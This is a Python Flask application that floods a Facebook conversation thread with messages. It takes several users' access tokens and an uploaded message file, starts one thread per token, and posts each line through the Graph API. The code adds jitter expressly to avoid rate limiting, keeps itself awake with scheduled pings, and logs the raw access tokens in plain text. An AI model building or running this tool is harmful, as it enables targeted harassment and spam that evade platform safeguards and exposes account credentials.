from flask import Flask, request, jsonify, render_template
import requests
import os
import time
from time import sleep
import threading
from datetime import datetime
import atexit
from apscheduler.schedulers.background import BackgroundScheduler
from database import init_db, add_user, update_user_status, get_all_users, cleanup_inactive_users
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['KEEP_ALIVE_URL'] = os.getenv('KEEP_ALIVE_URL', 'https://your-app-url.onrender.com')

def keep_alive():
    """Send request to keep the server alive with exponential backoff retry"""
    max_retries = 5
    base_delay = 1
    
    for attempt in range(max_retries):
        try:
            response = requests.get(app.config['KEEP_ALIVE_URL'], timeout=30)
            if response.status_code == 200:
                logger.info(f"Keep-alive ping successful at {datetime.now().isoformat()}")
                return True
            else:
                logger.warning(f"Keep-alive ping failed with status {response.status_code}")
        except Exception as e:
            delay = base_delay * (2 ** attempt)  # Exponential backoff
            logger.error(f"Keep-alive ping attempt {attempt + 1} failed: {str(e)}")
            if attempt < max_retries - 1:
                time.sleep(delay)
    
    logger.error("All keep-alive attempts failed")
    return False

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# Initialize database
init_db()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        tokens = request.form.getlist('accessToken[]')
        thread_id = request.form['threadId']
        kidx = request.form['kidx']
        time_interval = int(request.form['time'])
        
        if 'txtFile' not in request.files:
            return 'No file uploaded'
        
        file = request.files['txtFile']
        if file.filename == '':
            return 'No file selected'
            
        if file:
            messages = file.read().decode('utf-8').splitlines()
            
            for token in tokens:
                # Add user to database
                add_user(token)
                
                thread = threading.Thread(target=send_messages, args=(token, thread_id, kidx, messages, time_interval))
                thread.daemon = True
                thread.start()
                
            return 'Messages are being sent using multiple tokens!'
    
    # Get current active users
    current_users = get_all_users()
    return render_template('index.html', active_users=current_users)

def send_messages(token, thread_id, kidx, messages, time_interval):
    try:
        total_messages = len(messages)
        sent_messages = 0
        retry_count = 0
        max_retries = 3
        
        for message1 in messages:
            while retry_count < max_retries:
                try:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(kidx) + ' ' + message1
                    parameters = {'access_token': token, 'message': message}
                    
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=30)
                    if response.status_code == 200:
                        sent_messages += 1
                        update_user_status(token, 'active', sent_messages)
                        logger.info(f"Message sent using token {token}: {message}")
                        break  # Success, exit retry loop
                    else:
                        logger.warning(f"Failed to send message using token {token}: {message}")
                        retry_count += 1
                        if retry_count == max_retries:
                            update_user_status(token, 'error', sent_messages)
                    
                    # Add jitter to avoid rate limiting
                    jitter = time_interval + (time_interval * 0.1 * (retry_count + 1))
                    time.sleep(jitter)
                    
                except Exception as e:
                    logger.error(f"Error sending message: {str(e)}")
                    retry_count += 1
                    if retry_count == max_retries:
                        update_user_status(token, 'error', sent_messages)
                        time.sleep(60)  # Longer delay on persistent errors
                    else:
                        time.sleep(30)  # Short delay between retries
                        
    except Exception as e:
        logger.error(f"Error in send_messages: {str(e)}")
        update_user_status(token, 'error')
    finally:
        update_user_status(token, 'completed', sent_messages)

# Start cleanup thread
def cleanup_thread():
    while True:
        try:
            cleanup_inactive_users()
            time.sleep(3600)  # Run every hour
        except Exception as e:
            logger.error(f"Error in cleanup thread: {str(e)}")
            time.sleep(300)  # Wait 5 minutes on error before retrying

cleanup_thread = threading.Thread(target=cleanup_thread)
cleanup_thread.daemon = True
cleanup_thread.start()

# Status endpoint for uptime monitoring
@app.route('/status', methods=['GET'])
def status():
    try:
        users = get_all_users()
        return jsonify({
            'status': 'online',
            'timestamp': datetime.now().isoformat(),
            'active_users': len(users),
            'uptime': time.time() - app.start_time
        }), 200
    except Exception as e:
        logger.error(f"Error in status endpoint: {str(e)}")
        return jsonify({
            'status': 'error',
            'error': str(e)
        }), 500

# Initialize scheduler with more frequent keep-alive checks
scheduler = BackgroundScheduler(daemon=True)
scheduler.add_job(func=keep_alive, trigger="interval", minutes=2)  # More frequent checks
scheduler.add_job(func=cleanup_inactive_users, trigger="interval", hours=1)
scheduler.start()

# Shut down the scheduler when exiting the app
atexit.register(lambda: scheduler.shutdown())

# Store start time for uptime tracking
app.start_time = time.time()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # Set Keep-Alive URL based on port
    if port != 5000:  # Production
        app.config['KEEP_ALIVE_URL'] = f"https://{os.environ.get('RENDER_EXTERNAL_URL', '')}/status"
    else:  # Development
        app.config['KEEP_ALIVE_URL'] = f"http://localhost:{port}/status"
    
    app.run(debug=False, host='0.0.0.0', port=port)